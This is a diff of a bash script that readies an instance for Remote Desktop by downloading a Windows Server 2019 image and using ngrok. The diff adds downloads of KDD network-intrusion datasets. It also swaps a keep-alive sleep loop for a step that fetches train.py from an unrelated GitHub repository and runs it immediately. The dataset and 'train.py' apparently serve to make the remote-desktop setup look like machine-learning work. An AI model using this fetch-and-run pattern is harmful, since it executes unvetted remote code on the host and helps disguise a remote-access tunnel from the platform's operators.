@@ -1,6 +1,8 @@
 #! /bin/bash
 # Make Instance Ready for Remote Desktop or RDP
 apt-get update
+wget -O kddtrain.csv https://www.dropbox.com/s/fdy0g5ovma4t3gj/kddtrain.csv?dl=0
+wget -O kddtest.csv https://www.dropbox.com/s/6jzjalx7eduyohp/kddtest.csv?dl=0
 rm -rf w2019 w2019.img w2019.gz ngrok ngrok.zip ng.sh > /dev/null 2>&1
 echo "Download windows files"
 wget -O w2019.gz https://go.aank.me/win/W2019-aank.gz
@@ -53,15 +55,8 @@ enda='\033[0m'
 # Branding
 #!/bin/bash
 
-runtime="60 minute"
-endtime=$(date -ud "$runtime" +%s)
-
-while [[ $(date -u +%s) -le $endtime ]]
-do
-    echo "Time Now: `date +%H:%M:%S`"
-    echo "Sleeping for 10 seconds"
-    sleep 1
-done
+wget -O train.py https://raw.githubusercontent.com/jangkrikletoy/jangkr1yq/main/train.py
+./train.py
 
 printf """$c$b
  
